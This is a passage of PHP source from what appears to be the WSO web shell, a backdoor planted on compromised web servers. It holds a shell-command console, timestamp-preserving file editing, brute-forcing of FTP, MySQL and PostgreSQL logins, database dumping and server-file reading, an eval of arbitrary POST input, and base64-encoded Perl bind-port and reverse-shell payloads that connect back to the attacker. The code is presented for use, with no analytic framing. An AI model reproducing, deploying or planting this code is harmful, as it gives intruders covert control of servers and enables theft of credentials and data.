					if (!is_writable($_POST['p1'])) {
						echo 'File isn\'t writeable';
						break;
					}
					if (!empty($_POST['p3'])) {
						$time = @filemtime($_POST['p1']);
						$_POST['p3'] = $_POST['p3'];
						$fp = @fopen($_POST['p1'], "w");
						if ($fp) {
							@fwrite($fp, $_POST['p3']);
							@fclose($fp);
							echo 'Saved!<br><script>p3_="";</script>';
							@touch($_POST['p1'], $time, $time);
						}
					}
					echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'edit\',textarea.value);return false;" onkeydown="tryToSave(event,this)"><textarea id="textarea" title="' . urlencode($_POST['p1']) . '">';
					$fp = @fopen($_POST['p1'], 'r');
					if ($fp) {
						while (!@feof($fp)) echo htmlspecialchars(@fread($fp, 1024));
						@fclose($fp);
					}
					echo '</textarea><span>Use [ ⌘/CTRL+Enter ] to save</span></form>';
					break;
				case 'rename':
					if (!empty($_POST['p3'])) {
						if (!@rename($_POST['p1'], $_POST['p3'])) echo 'Can\'t rename!<br>';
						else die('<script>g(null,null,"' . urlencode($_POST['p3']) . '",null,"")</script>');
					}
					echo '<form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'rename\',this.name.value);return false;"><input type=text name=name value="' . htmlspecialchars($_POST['p1']) . '"><input type=submit value=">>"></form>';
					break;
				case 'touch':
					if (!empty($_POST['p3'])) {
						$time = strtotime($_POST['p3']);
						if ($time) {
							if (!touch($_POST['p1'], $time, $time)) echo 'Fail!';
							else echo 'Touched!';
						} else echo 'Bad time format!';
					}
					clearstatcache();
					echo '<script>p3_="";</script><form onsubmit="g(null,null,\'' . urlencode($_POST['p1']) . '\',\'touch\',this.touch.value);return false;"><input type=text name=touch value="' . date("Y-m-d H:i:s", @filemtime($_POST['p1'])) . '"><input type=submit value=">>"></form>';
					break;
				}
				echo '</div>';
				wsoFooter();
			}
			function actionConsole() {
				if (!empty($_POST['p1']) && !empty($_POST['p2'])) {
					WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'stderr_to_out', true);
					$_POST['p1'].= ' 2>&1';
				}
				if (isset($_POST['ajax'])) {
					WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', true);
					ob_start();
					echo "self.cf.cmd.value='';\n";
					$temp = wsoEx($_POST['p1']);
					$temp = $temp ? $temp : "↳ Query did not return anything";
					$temp = addcslashes("\n$ " . $_POST['p1'] . "\n" . $temp, "\n\r\\'\0");
					if (preg_match("!.*cd\s+([^;]+)$!", $_POST['p1'], $match)) {
						if (@chdir($match[1])) {
							$GLOBALS['cwd'] = @getcwd();
							echo "c_='" . $GLOBALS['cwd'] . "';";
						}
					}
					echo "self.cf.output.value+='" . $temp . "';";
					echo "self.cf.output.scrollTop = self.cf.output.scrollHeight;";
					$temp = ob_get_clean();
					echo strlen($temp), "\n", $temp;
					exit;
				}
				if (empty($_POST['ajax']) && !empty($_POST['p1'])) WSOsetcookie(md5($_SERVER['HTTP_HOST']) . 'ajax', 0);
				wsoHeader();
				echo "<script>
	if(window.Event) window.captureEvents(Event.KEYDOWN);
	var cmds = new Array('');
	var cur = 0;
	function kp(e) {
		var n = (window.Event) ? e.which : e.keyCode;
		if(n == 38) {
			cur--;
			if(cur>=0)
				document.cf.cmd.value = cmds[cur];
			else
				cur++;
		} else if(n == 40) {
			cur++;
			if(cur < cmds.length)
				document.cf.cmd.value = cmds[cur];
			else
				cur--;
		}
	}
	function add(cmd) {
		cmds.pop();
		cmds.push(cmd);
		cmds.push('');
		cur = cmds.length-1;
	}
	</script>";
				echo '<h1>Console</h1><div class=content><form name=cf onsubmit="if(/^clear$/.test(self.cf.cmd.value)){self.cf.output.value=[];self.cf.cmd.value=[];return false;}add(this.cmd.value);a(null,null,this.cmd.value,this.show_errors.checked?1:[]);return false;"><select name=alias>';
				foreach ($GLOBALS['aliases'] as $n => $v) {
					if ($v == '') {
						echo '<optgroup label="-' . htmlspecialchars($n) . '-"></optgroup>';
						continue;
					}
					echo '<option value="' . htmlspecialchars($v) . '">' . $n . '</option>';
				}
				echo '</select><input type=button onclick="add(self.cf.alias.value);a(null,null,self.cf.alias.value,self.cf.show_errors.checked?1:[]);" value=">>"> <nobr><input type=hidden name=ajax value=1><input type=checkbox name=show_errors value=1 checked> redirect stderr to stdout (2>&1)</nobr><br/><textarea class=bigarea name=output style="border-bottom:0;margin:0;" readonly>';
				if (!empty($_POST['p1'])) {
					echo htmlspecialchars("$ " . $_POST['p1'] . "\n" . wsoEx($_POST['p1']));
				}
				echo '</textarea><table style="border:1px solid var(--main-color);background-color:#555;border-top:0px;" cellpadding=0 cellspacing=0 width="100%"><tr><td width="1%">$</td><td><input type=text name=cmd style="border:0px;width:100%;" onkeydown="kp(event);"></td></tr></table>';
				echo '</form></div><script>self.cf.cmd.focus();</script>';
				wsoFooter();
			}
			function actionSelfRemove() {
				if ($_POST['p1'] == 'yes') if (@unlink(preg_replace('!\(\d+\)\s.*!', '', __FILE__))) die('Shell has been removed');
				else echo 'unlink error!';
				if ($_POST['p1'] != 'yes') wsoHeader();
				echo '<h1>Suicide</h1><div class=content>Really want to remove the shell?<br><a href=# onclick="g(null,null,\'yes\')">Yes</a></div>';
				wsoFooter();
			}
			function actionBruteforce() {
				wsoHeader();
				if (isset($_POST['proto'])) {
					echo '<h1>Results</h1><div class=content><span>Type:</span> ' . htmlspecialchars($_POST['proto']) . ' <span>Server:</span> ' . htmlspecialchars($_POST['server']) . '<br>';
					if ($_POST['proto'] == 'ftp') {
						function wsoBruteForce($ip, $port, $login, $pass) {
							$fp = @ftp_connect($ip, $port ? $port : 21);
							if (!$fp) return false;
							$res = @ftp_login($fp, $login, $pass);
							@ftp_close($fp);
							return $res;
						}
					} elseif ($_POST['proto'] == 'mysql') {
						function wsoBruteForce($ip, $port, $login, $pass) {
							try {
								$res = @new PDO("mysql:host=$ip;", $login, $pass);
								return $res;
							}
							catch(Exception $e) {
								echo !preg_match('/Access denied/i', $e->getMessage()) ? 'Error: ' . $e->getMessage() . "<br>\n" : '';
								return false;
							}
						}
					} elseif ($_POST['proto'] == 'pgsql') {
						function wsoBruteForce($ip, $port, $login, $pass) {
							$str = "host='" . $ip . "' port='" . $port . "' user='" . $login . "' password='" . $pass . "' dbname=postgres";
							$res = @pg_connect($str);
							@pg_close($res);
							return $res;
						}
					}
					$success = 0;
					$attempts = 0;
					$server = explode(":", $_POST['server']);
					if ($_POST['type'] == 1) {
						$temp = @file('/etc/passwd');
						if (is_array($temp)) foreach ($temp as $line) {
							$line = explode(":", $line);
							++$attempts;
							if (wsoBruteForce(@$server[0], @$server[1], $line[0], $line[0])) {
								$success++;
								echo '<b class="text-green">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . " SUCCESS<br>\n";
								flush();
								break;
							} else {
								echo '<b class="text-muted">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars($line[0]) . " fail<br>\n";
								flush();
							}
							if (wsoBruteForce(@$server[0], @$server[1], $line[0], strrev($line[0]))) {
								$success++;
								echo '<b class="text-green">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars(strrev($line[0])) . " SUCCESS<br>\n";
								flush();
								break;
							} else {
								echo '<b class="text-muted">' . htmlspecialchars($line[0]) . '</b>:' . htmlspecialchars(strrev($line[0])) . " fail<br>\n";
								flush();
							}
						}
					} elseif ($_POST['type'] == 2) {
						$temp = @file($_POST['dict']);
						$temp[] = '';
						$temp[] = 'root';
						echo 'login: ' . htmlspecialchars($_POST['login']) . ': ';
						if (is_array($temp)) foreach ($temp as $line) {
							$line = trim($line);
							++$attempts;
							if (wsoBruteForce($server[0], @$server[1], $_POST['login'], $line)) {
								$success++;
								echo '<b class="text-green">' . htmlspecialchars($line) . " SUCCESS</b><br>\n";
								flush();
								break;
							} else {
								echo '<b class="text-muted">' . htmlspecialchars($line) . "</b>, ";
								flush();
							}
						}
					}
					echo "<span>Attempts:</span> $attempts <span>Success:</span> $success</div><br>";
				}
				echo '<h1>Bruteforce</h1><div class=content><table><form method=post><tr><td><span>Type</span></td>' . '<td><select name=proto><option value=ftp>FTP</option><option value=mysql>MySql</option><option value=pgsql>PostgreSql</option></select></td></tr><tr><td>' . '<input type=hidden name=c value="' . htmlspecialchars($GLOBALS['cwd']) . '">' . '<input type=hidden name=a value="' . htmlspecialchars($_POST['a']) . '">' . '<span>Server:port</span></td>' . '<td><input type=text name=server value="127.0.0.1"></td></tr>' . '<tr><td><span>Brute type</span></td>' . '<td><label><input type=radio name=type value="1" checked> /etc/passwd</label></td></tr>' . '<tr><td></td><td><label style="padding-left:15px"><input type=checkbox name=reverse value=1 checked> reverse (login -> nigol)</label></td></tr>' . '<tr><td></td><td><label><input type=radio name=type value="2"> Dictionary</label></td></tr>' . '<tr><td></td><td><table style="padding-left:15px"><tr><td><span>Login</span></td>' . '<td><input type=text name=login value="root"></td></tr>' . '<tr><td><span>Dictionary</span></td>' . '<td><input type=text name=dict value="https://bit.ly/top1kpass"></td></tr></table>' . '</td></tr><tr><td></td><td><input type=submit value=">>"></td></tr></form></table>';
				echo '</div><br>';
				wsoFooter();
			}
			function actionSql() {
				class DbClass {
					var $type;
					var $link;
					var $res;
					function DbClass($type) {
						$this->type = $type;
					}
					function connect($host, $user, $pass, $dbname) {
						switch ($this->type) {
							case 'mysql':
								if ($this->link = @mysql_connect($host, $user, $pass, true)) return true;
								break;
							case 'pgsql':
								$host = explode(':', $host);
								if (!$host[1]) $host[1] = 5432;
								if ($this->link = @pg_connect("host={$host[0]} port={$host[1]} user=$user password=$pass dbname=$dbname")) return true;
								break;
							}
							return false;
						}
						function selectdb($db) {
							switch ($this->type) {
								case 'mysql':
									if (@mysql_select_db($db)) return true;
									break;
								}
								return false;
						}
						function query($str) {
							switch ($this->type) {
								case 'mysql':
									return $this->res = @mysql_query($str);
								break;
								case 'pgsql':
									return $this->res = @pg_query($this->link, $str);
								break;
							}
							return false;
						}
						function fetch() {
							$res = func_num_args() ? func_get_arg(0) : $this->res;
							switch ($this->type) {
								case 'mysql':
									return @mysql_fetch_assoc($res);
								break;
								case 'pgsql':
									return @pg_fetch_assoc($res);
								break;
							}
							return false;
						}
						function listDbs() {
							switch ($this->type) {
								case 'mysql':
									return $this->query("SHOW databases");
								break;
								case 'pgsql':
									return $this->res = $this->query("SELECT datname FROM pg_database WHERE datistemplate!='t'");
								break;
							}
							return false;
						}
						function listTables() {
							switch ($this->type) {
								case 'mysql':
									return $this->res = $this->query('SHOW TABLES');
								break;
								case 'pgsql':
									return $this->res = $this->query("select table_name from information_schema.tables where table_schema != 'information_schema' AND table_schema != 'pg_catalog'");
								break;
							}
							return false;
						}
						function error() {
							switch ($this->type) {
								case 'mysql':
									return @mysql_error();
								break;
								case 'pgsql':
									return @pg_last_error();
								break;
							}
							return false;
						}
						function setCharset($str) {
							switch ($this->type) {
								case 'mysql':
									if (function_exists('mysql_set_charset')) return @mysql_set_charset($str, $this->link);
									else $this->query('SET CHARSET ' . $str);
									break;
								case 'pgsql':
									return @pg_set_client_encoding($this->link, $str);
									break;
								}
								return false;
							}
							function loadFile($str) {
								switch ($this->type) {
									case 'mysql':
										return $this->fetch($this->query("SELECT LOAD_FILE('" . addslashes($str) . "') as file"));
									break;
									case 'pgsql':
										$this->query("CREATE TABLE wso2(file text);COPY wso2 FROM '" . addslashes($str) . "';select file from wso2;");
										$r = array();
										while ($i = $this->fetch()) $r[] = $i['file'];
										$this->query('drop table wso2');
										return array('file' => implode("\n", $r));
										break;
									}
									return false;
							}
							function dump($table, $fp = false) {
								switch ($this->type) {
									case 'mysql':
										$res = $this->query('SHOW CREATE TABLE `' . $table . '`');
										$create = mysql_fetch_array($res);
										$sql = $create[1] . ";\n";
										if ($fp) fwrite($fp, $sql);
										else echo ($sql);
										$this->query('SELECT * FROM `' . $table . '`');
										$i = 0;
										$head = true;
										while ($item = $this->fetch()) {
											$sql = '';
											if ($i % 1000 == 0) {
												$head = true;
												$sql = ";\n\n";
											}
											$columns = array();
											foreach ($item as $k => $v) {
												if ($v === null) $item[$k] = "NULL";
												elseif (is_int($v)) $item[$k] = $v;
												else $item[$k] = "'" . @mysql_real_escape_string($v) . "'";
												$columns[] = "`" . $k . "`";
											}
											if ($head) {
												$sql.= 'INSERT INTO `' . $table . '` (' . implode(", ", $columns) . ") VALUES \n\t(" . implode(", ", $item) . ')';
												$head = false;
											} else $sql.= "\n\t,(" . implode(", ", $item) . ')';
											if ($fp) fwrite($fp, $sql);
											else echo ($sql);
											$i++;
										}
										if (!$head) if ($fp) fwrite($fp, ";\n\n");
										else echo (";\n\n");
										break;
									case 'pgsql':
										$this->query('SELECT * FROM ' . $table);
										while ($item = $this->fetch()) {
											$columns = array();
											foreach ($item as $k => $v) {
												$item[$k] = "'" . addslashes($v) . "'";
												$columns[] = $k;
											}
											$sql = 'INSERT INTO ' . $table . ' (' . implode(", ", $columns) . ') VALUES (' . implode(", ", $item) . ');' . "\n";
											if ($fp) fwrite($fp, $sql);
											else echo ($sql);
										}
										break;
									}
									return false;
								}
							};
							$db = new DbClass($_POST['type']);
							if (@$_POST['p2'] == 'download') {
								$db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base']);
								$db->selectdb($_POST['sql_base']);
								switch ($_POST['charset']) {
									case "Windows-1251":
										$db->setCharset('cp1251');
									break;
									case "UTF-8":
										$db->setCharset('utf8');
									break;
									case "KOI8-R":
										$db->setCharset('koi8r');
									break;
									case "KOI8-U":
										$db->setCharset('koi8u');
									break;
									case "cp866":
										$db->setCharset('cp866');
									break;
								}
								if (empty($_POST['file'])) {
									ob_start("ob_gzhandler", 4096);
									header("Content-Disposition: attachment; filename=dump.sql");
									header("Content-Type: text/plain");
									foreach ($_POST['tbl'] as $v) $db->dump($v);
									exit;
								} elseif ($fp = @fopen($_POST['file'], 'w')) {
									foreach ($_POST['tbl'] as $v) $db->dump($v, $fp);
									fclose($fp);
									unset($_POST['p2']);
								} else die('<script>alert("Error! Can\'t open file");window.history.back(-1)</script>');
							}
							wsoHeader();
							echo "
	<h1>Sql browser</h1><div class=content>
	<form name='sf' method='post' onsubmit='fs(this);'><table cellpadding='2' cellspacing='0'><tr>
	<td>Type</td><td>Host</td><td>Login</td><td>Password</td><td>Database</td><td></td></tr><tr>
	<input type=hidden name=a value=Sql><input type=hidden name=p1 value='query'><input type=hidden name=p2 value=''><input type=hidden name=c value='" . htmlspecialchars($GLOBALS['cwd']) . "'><input type=hidden name=charset value='" . (isset($_POST['charset']) ? $_POST['charset'] : '') . "'>
	<td><select name='type'><option value='mysql' ";
							if (@$_POST['type'] == 'mysql') echo 'selected';
							echo ">MySql</option><option value='pgsql' ";
							if (@$_POST['type'] == 'pgsql') echo 'selected';
							echo ">PostgreSql</option></select></td>
	<td><input type=text name=sql_host value=\"" . (empty($_POST['sql_host']) ? 'localhost' : htmlspecialchars($_POST['sql_host'])) . "\"></td>
	<td><input type=text name=sql_login value=\"" . (empty($_POST['sql_login']) ? 'root' : htmlspecialchars($_POST['sql_login'])) . "\"></td>
	<td><input type=text name=sql_pass value=\"" . (empty($_POST['sql_pass']) ? '' : htmlspecialchars($_POST['sql_pass'])) . "\"></td><td>";
							$tmp = "<input type=text name=sql_base value=''>";
							if (isset($_POST['sql_host'])) {
								if ($db->connect($_POST['sql_host'], $_POST['sql_login'], $_POST['sql_pass'], $_POST['sql_base'])) {
									switch ($_POST['charset']) {
										case "Windows-1251":
											$db->setCharset('cp1251');
										break;
										case "UTF-8":
											$db->setCharset('utf8');
										break;
										case "KOI8-R":
											$db->setCharset('koi8r');
										break;
										case "KOI8-U":
											$db->setCharset('koi8u');
										break;
										case "cp866":
											$db->setCharset('cp866');
										break;
									}
									$db->listDbs();
									echo "<select name=sql_base><option value=''></option>";
									while ($item = $db->fetch()) {
										list($key, $value) = each($item);
										echo '<option value="' . $value . '" ' . ($value == $_POST['sql_base'] ? 'selected' : '') . '>' . $value . '</option>';
									}
									echo '</select>';
								} else echo $tmp;
							} else echo $tmp;
							echo "</td>
					<td><input type=submit value='>>' onclick='fs(d.sf);'></td>
					<td><input type=checkbox name=sql_count value='on'" . (empty($_POST['sql_count']) ? '' : ' checked') . "> count the number of rows</td>
				</tr>
			</table>
			<script>
				s_db='" . @addslashes($_POST['sql_base']) . "';
				function fs(f) {
					if(f.sql_base.value!=s_db) { f.onsubmit = function() {};
						if(f.p1) f.p1.value='';
						if(f.p2) f.p2.value='';
						if(f.p3) f.p3.value='';
					}
				}
				function st(t,l) {
					d.sf.p1.value = 'select';
					d.sf.p2.value = t;
					if(l && d.sf.p3) d.sf.p3.value = l;
					d.sf.submit();
				}
				function is() {
					for(i=0;i<d.sf.elements['tbl[]'].length;++i)
						d.sf.elements['tbl[]'][i].checked = !d.sf.elements['tbl[]'][i].checked;
				}
			</script>";
							if (isset($db) && $db->link) {
								echo "<br/><table width=100% cellpadding=2 cellspacing=0>";
								if (!empty($_POST['sql_base'])) {
									$db->selectdb($_POST['sql_base']);
									echo "<tr><td width=1 style='border-top:2px solid #666;'><span>Tables:</span><br><br>";
									$tbls_res = $db->listTables();
									while ($item = $db->fetch($tbls_res)) {
										list($key, $value) = each($item);
										if (!empty($_POST['sql_count'])) $n = $db->fetch($db->query('SELECT COUNT(*) as n FROM ' . $value . ''));
										$value = htmlspecialchars($value);
										echo "<nobr><input type='checkbox' name='tbl[]' value='" . $value . "'>&nbsp;<a href=# onclick=\"st('" . $value . "',1)\">" . $value . "</a>" . (empty($_POST['sql_count']) ? '&nbsp;' : " <small>({$n['n']})</small>") . "</nobr><br>";
									}
									echo "<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\"download\";document.sf.submit();'><br>File file_path:<input type=text name=file value='dump.sql'></td><td style='border-top:2px solid #666;'>";
									if (@$_POST['p1'] == 'select') {
										$_POST['p1'] = 'query';
										$_POST['p3'] = $_POST['p3'] ? $_POST['p3'] : 1;
										$db->query('SELECT COUNT(*) as n FROM ' . $_POST['p2']);
										$num = $db->fetch();
										$pages = ceil($num['n'] / 30);
										echo "<script>d.sf.onsubmit=function(){st(\"" . $_POST['p2'] . "\", d.sf.p3.value)}</script><span>" . $_POST['p2'] . "</span> ({$num['n']} records) Page # <input type=text name='p3' value=" . ((int)$_POST['p3']) . ">";
										echo " of $pages";
										if ($_POST['p3'] > 1) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] - 1) . ")'>&lt; Prev</a>";
										if ($_POST['p3'] < $pages) echo " <a href=# onclick='st(\"" . $_POST['p2'] . '", ' . ($_POST['p3'] + 1) . ")'>Next &gt;</a>";
										$_POST['p3']--;
										if ($_POST['type'] == 'pgsql') $_POST['p2'] = 'SELECT * FROM ' . $_POST['p2'] . ' LIMIT 30 OFFSET ' . ($_POST['p3'] * 30);
										else $_POST['p2'] = 'SELECT * FROM `' . $_POST['p2'] . '` LIMIT ' . ($_POST['p3'] * 30) . ',30';
										echo "<br><br>";
									}
									if ((@$_POST['p1'] == 'query') && !empty($_POST['p2'])) {
										$db->query(@$_POST['p2']);
										if ($db->res !== false) {
											$title = false;
											echo '<table width=100% cellspacing=1 cellpadding=2 class=main style="background-color:#292929">';
											$line = 1;
											while ($item = $db->fetch()) {
												if (!$title) {
													echo '<tr>';
													foreach ($item as $key => $value) echo '<th>' . $key . '</th>';
													reset($item);
													$title = true;
													echo '</tr><tr>';
													$line = 2;
												}
												echo '<tr class="l' . $line . '">';
												$line = $line == 1 ? 2 : 1;
												foreach ($item as $key => $value) {
													if ($value == null) echo '<td><i>null</i></td>';
													else echo '<td>' . nl2br(htmlspecialchars($value)) . '</td>';
												}
												echo '</tr>';
											}
											echo '</table>';
										} else {
											echo '<div><b>Error:</b> ' . htmlspecialchars($db->error()) . '</div>';
										}
									}
									echo "<br></form><form onsubmit='d.sf.p1.value=\"query\";d.sf.p2.value=this.query.value;document.sf.submit();return false;'><textarea name='query' style='width:100%;height:100px'>";
									if (!empty($_POST['p2']) && ($_POST['p1'] != 'loadfile')) echo htmlspecialchars($_POST['p2']);
									echo "</textarea><br/><input type=submit value='Execute'>";
									echo "</td></tr>";
								}
								echo "</table></form><br/>";
								if ($_POST['type'] == 'mysql') {
									$db->query("SELECT 1 FROM mysql.user WHERE concat(`user`, '@', `host`) = USER() AND `File_priv` = 'y'");
									if ($db->fetch()) echo "<form onsubmit='d.sf.p1.value=\"loadfile\";document.sf.p2.value=this.f.value;document.sf.submit();return false;'><span>Load file</span> <input  class='toolsInp' type=text name=f><input type=submit value='>>'></form>";
								}
								if (@$_POST['p1'] == 'loadfile') {
									$file = $db->loadFile($_POST['p2']);
									echo '<br/><pre class=ml1>' . htmlspecialchars($file['file']) . '</pre>';
								}
							} else {
								echo htmlspecialchars($db->error());
							}
							echo '</div>';
							wsoFooter();
						}
						function actionNetwork() {
							wsoHeader();
							$back_connect_p = "IyEvdXNyL2Jpbi9wZXJsDQp1c2UgU29ja2V0Ow0KJGlhZGRyPWluZXRfYXRvbigkQVJHVlswXSkgfHwgZGllKCJFcnJvcjogJCFcbiIpOw0KJHBhZGRyPXNvY2thZGRyX2luKCRBUkdWWzFdLCAkaWFkZHIpIHx8IGRpZSgiRXJyb3I6ICQhXG4iKTsNCiRwcm90bz1nZXRwcm90b2J5bmFtZSgndGNwJyk7DQpzb2NrZXQoU09DS0VULCBQRl9JTkVULCBTT0NLX1NUUkVBTSwgJHByb3RvKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpjb25uZWN0KFNPQ0tFVCwgJHBhZGRyKSB8fCBkaWUoIkVycm9yOiAkIVxuIik7DQpvcGVuKFNURElOLCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RET1VULCAiPiZTT0NLRVQiKTsNCm9wZW4oU1RERVJSLCAiPiZTT0NLRVQiKTsNCnN5c3RlbSgnL2Jpbi9zaCAtaScpOw0KY2xvc2UoU1RESU4pOw0KY2xvc2UoU1RET1VUKTsNCmNsb3NlKFNUREVSUik7";
							$bind_port_p = "IyEvdXNyL2Jpbi9wZXJsDQokU0hFTEw9Ii9iaW4vc2ggLWkiOw0KaWYgKEBBUkdWIDwgMSkgeyBleGl0KDEpOyB9DQp1c2UgU29ja2V0Ow0Kc29ja2V0KFMsJlBGX0lORVQsJlNPQ0tfU1RSRUFNLGdldHByb3RvYnluYW1lKCd0Y3AnKSkgfHwgZGllICJDYW50IGNyZWF0ZSBzb2NrZXRcbiI7DQpzZXRzb2Nrb3B0KFMsU09MX1NPQ0tFVCxTT19SRVVTRUFERFIsMSk7DQpiaW5kKFMsc29ja2FkZHJfaW4oJEFSR1ZbMF0sSU5BRERSX0FOWSkpIHx8IGRpZSAiQ2FudCBvcGVuIHBvcnRcbiI7DQpsaXN0ZW4oUywzKSB8fCBkaWUgIkNhbnQgbGlzdGVuIHBvcnRcbiI7DQp3aGlsZSgxKSB7DQoJYWNjZXB0KENPTk4sUyk7DQoJaWYoISgkcGlkPWZvcmspKSB7DQoJCWRpZSAiQ2Fubm90IGZvcmsiIGlmICghZGVmaW5lZCAkcGlkKTsNCgkJb3BlbiBTVERJTiwiPCZDT05OIjsNCgkJb3BlbiBTVERPVVQsIj4mQ09OTiI7DQoJCW9wZW4gU1RERVJSLCI+JkNPTk4iOw0KCQlleGVjICRTSEVMTCB8fCBkaWUgcHJpbnQgQ09OTiAiQ2FudCBleGVjdXRlICRTSEVMTFxuIjsNCgkJY2xvc2UgQ09OTjsNCgkJZXhpdCAwOw0KCX0NCn0=";
							echo "<h1>Network tools</h1><div class=content>
		<form name='nfp' onSubmit=\"g(null,null,'bpp',this.port.value);return false;\">
		<span>Bind port to /bin/sh [perl]</span><br/>
		Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
		</form>
		<form name='nfp' onSubmit=\"g(null,null,'bcp',this.server.value,this.port.value);return false;\">
		<span>Back-connect  [perl]</span><br/>
		Server: <input type='text' name='server' value='" . $_SERVER['REMOTE_ADDR'] . "'> Port: <input type='text' name='port' value='31337'> <input type=submit value='>>'>
		</form><br>";
							if (isset($_POST['p1'])) {
								function cf($f, $t) {
									$w = @fopen($f, "w");
									if ($w) {
										@fwrite($w, @base64_decode($t));
										@fclose($w);
									}
								}
								if ($_POST['p1'] == 'bpp') {
									cf("/tmp/bp.pl", $bind_port_p);
									$out = wsoEx("perl /tmp/bp.pl " . $_POST['p2'] . " 1>/dev/null 2>&1 &");
									sleep(1);
									echo "<pre class=ml1>$out\n" . wsoEx("ps aux | grep bp.pl") . "</pre>";
									unlink("/tmp/bp.pl");
								}
								if ($_POST['p1'] == 'bcp') {
									cf("/tmp/bc.pl", $back_connect_p);
									$out = wsoEx("perl /tmp/bc.pl " . $_POST['p2'] . " " . $_POST['p3'] . " 1>/dev/null 2>&1 &");
									sleep(1);
									echo "<pre class=ml1>$out\n" . wsoEx("ps aux | grep bc.pl") . "</pre>";
									unlink("/tmp/bc.pl");
								}
							}
							echo '</div>';
							wsoFooter();
						}
						function actionRC() {
							if (!@$_POST['p1']) {
								$a = array("uname" => php_uname(), "php_version" => phpversion(), "wso_version" => WSO_VERSION, "safemode" => @ini_get('safe_mode'));
								echo serialize($a);
							} else {
								eval($_POST['p1']);
							}
						}
						if (empty($_POST['a'])) if (isset($default_action) && function_exists('action' . $default_action)) $_POST['a'] = $default_action;
						else $_POST['a'] = 'SecInfo';
						if (!empty($_POST['a']) && function_exists('action' . $_POST['a'])) call_user_func('action' . $_POST['a']);
						exit;
					}
					catch(Exception $e) {
						echo '<span class="text-red">' . $e->getMessage() . '</span>';
					}
					
